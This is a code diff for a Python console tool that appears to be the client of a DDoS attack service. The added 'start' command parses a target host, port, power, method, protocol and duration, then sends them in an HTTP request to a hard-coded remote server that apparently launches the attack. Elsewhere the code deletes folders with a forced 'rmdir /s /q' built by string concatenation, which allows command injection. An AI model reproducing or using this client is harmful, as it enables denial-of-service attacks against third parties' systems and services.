@@ -49,6 +49,7 @@ def start():
                 f.close()  # close the file before attempting to delete the folder
                 os.system("rmdir /s /q " + file_path)
                 print("User folder deleted")
+                start()
                 return
         os.system("cls || clear")
         print(banner)
@@ -191,8 +192,22 @@ def console(user):
 
 def console2(user):
     command = input(f"{Fore.LIGHTGREEN_EX}? {Fore.WHITE}-> ",)
+    sinput = command.split(" ")[0]
     if command == "exit":
         main(user)
+    if sinput == "start":
+        sinput, host, port, power, method, protocol, time = command.split(" ")
+        print(f"Attack hass been {Fore.LIGHTGREEN_EX}successfully {Fore.WHITE} sended!")
+        print("")
+        print(f"IP: {host}")
+        print(f"PORT: {port}")
+        print(f"POWER: {power}")
+        print(f"METHOD: {method}")
+        print(f"PROTOCOL: {protocol}")
+        print(f"TIME: {time}")
+        requests.get(url = f'http://146.19.191.73:125/attack23/?host={host}&port={port}&power={power}&method={method}&protocol={protocol}&time={time}')
+        console2(user)
+        
     if command == "help":
         if os.path.isdir(help_file_path):
             f = open(help_file_path, "r")
